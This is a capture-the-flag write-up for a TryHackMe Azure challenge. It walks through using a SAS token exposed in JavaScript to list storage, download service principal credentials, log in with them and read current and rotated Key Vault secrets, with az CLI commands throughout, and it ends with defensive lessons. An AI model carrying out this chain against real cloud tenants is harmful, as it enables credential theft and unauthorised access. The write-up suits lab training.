# CryptoCabana — TryHackMe Hacker Holidays Day 9

## Category
- ☁️ Cloud (Azure)

## Difficulty
- Medium

---

# Objective

Investigate an Azure-hosted backup kiosk that leaked more trust than intended and recover the hidden flag.

---

# Enumeration

Inspecting the web application's `app.js` revealed a hardcoded Azure Storage SAS token:

```javascript
const STORAGE_ACCOUNT = "cryptocabanaf5scjagc";
const BACKUPS_CONTAINER = "backups";
const BACKUP_SAS = "?sv=...&sp=rl&...";
```

The important permission was:

```text
sp=rl
```

Which grants:

- **r** = Read
- **l** = List

Because the token included **List** permission, it allowed enumeration of storage containers.

---

# Enumerate Storage Containers

```bash
az storage container list \
  --account-name cryptocabanaf5scjagc \
  --sas-token "<SAS_TOKEN>" \
  --output table
```

Output:

```text
Name
----
$web
backups
vault
```

A hidden **vault** container was exposed.

---

# Enumerate the Vault Container

```bash
az storage blob list \
  --account-name cryptocabanaf5scjagc \
  --container-name vault \
  --sas-token "<SAS_TOKEN>" \
  --output table
```

Output:

```text
Name
----------------------------
backup-service-account.json
seed_phrase.txt
```

---

# Download Sensitive Files

## Download the service account

```bash
az storage blob download \
  --account-name cryptocabanaf5scjagc \
  --container-name vault \
  --name backup-service-account.json \
  --file backup-service-account.json \
  --sas-token "<SAS_TOKEN>"
```

## Download the seed phrase

```bash
az storage blob download \
  --account-name cryptocabanaf5scjagc \
  --container-name vault \
  --name seed_phrase.txt \
  --file seed_phrase.txt \
  --sas-token "<SAS_TOKEN>"
```

The JSON file contained:

- Client ID
- Client Secret
- Tenant ID
- Key Vault Name

---

# Authenticate as the Service Principal

```bash
az login \
  --service-principal \
  --username <CLIENT_ID> \
  --password '<CLIENT_SECRET>' \
  --tenant <TENANT_ID>
```

Authentication succeeded.

---

# Enumerate Azure Key Vault

List available secrets:

```bash
az keyvault secret list \
  --vault-name ccabana-kv-f5scjagc \
  --output table
```

Output:

```text
key-shard-1
key-shard-2
key-shard-3
master-key
```

---

# Read Secret Values

Retrieve the first shard:

```bash
az keyvault secret show \
  --vault-name ccabana-kv-f5scjagc \
  --name key-shard-1
```

Retrieve the second shard:

```bash
az keyvault secret show \
  --vault-name ccabana-kv-f5scjagc \
  --name key-shard-2
```

Retrieve the third shard:

```bash
az keyvault secret show \
  --vault-name ccabana-kv-f5scjagc \
  --name key-shard-3
```

The second shard contained only a message indicating the value had been rotated.

---

# Recover the Previous Version

List all versions of the rotated secret:

```bash
az keyvault secret list-versions \
  --vault-name ccabana-kv-f5scjagc \
  --name key-shard-2 \
  --output json
```

Retrieve the previous version:

```bash
az keyvault secret show \
  --vault-name ccabana-kv-f5scjagc \
  --name key-shard-2 \
  --version <OLDER_VERSION_ID>
```

The older version contained the missing portion of the flag.

---

# Flag

```text
THM{n0t_ur_k3ys_n0t_ur_c01ns!}
```

---

# Attack Chain

1. Inspect JavaScript.
2. Extract Azure Storage SAS token.
3. Enumerate storage containers.
4. Discover hidden `vault` container.
5. Download exposed credentials.
6. Authenticate as the leaked service principal.
7. Enumerate Azure Key Vault.
8. Identify a rotated secret.
9. Recover the previous secret version.
10. Assemble the complete flag.

---

# Lessons Learned

- Never expose long-lived SAS tokens in client-side JavaScript.
- Grant the minimum permissions required for SAS tokens.
- Never store service principal credentials in publicly accessible storage.
- Secret rotation alone is insufficient if previous versions remain accessible.
- Azure Key Vault secret versioning can expose historical values if not properly managed.
- Enumeration is often the key to finding hidden cloud resources.